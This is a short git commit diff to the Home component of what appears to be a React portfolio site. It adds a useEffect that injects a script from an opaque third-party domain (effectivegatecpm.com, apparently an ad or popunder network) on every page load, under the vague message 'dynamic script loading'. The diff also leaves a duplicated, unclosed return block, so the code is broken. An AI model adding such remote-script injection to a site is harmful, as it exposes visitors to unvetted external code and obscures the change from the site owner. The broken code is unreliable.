6c3793922ca6c3dbde96d45e4b72b201dc458858
Kira <saadkaddioui6@gmail.com>
2026-01-31 15:01:36 +0100

    Implement dynamic script loading in Home component
    Added useEffect to load external script dynamically.

--- src/components/Home/Home.js
+++ src/components/Home/Home.js
@@ -1,4 +1,4 @@
-import React from "react";
+import React, { useEffect } from "react";
 import { Container, Row, Col } from "react-bootstrap";
 import homeLogo from "../../Assets/home-main.svg";
 import Particle from "../Particle";
@@ -14,6 +14,22 @@ import {
 import { FaLinkedinIn } from "react-icons/fa";
 
 function Home() {
+
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.src = "https://pl28617432.effectivegatecpm.com/95/a0/20/95a020556c8a57edf0eb09a502aae886.js";
+    script.async = true;
+    document.body.appendChild(script);
+
+    return () => {
+      document.body.removeChild(script);
+    };
+  }, []);
+
+  return (
+    <section>
+
+  
   return (
     <section>
       <Container fluid className="home-section" id="home">
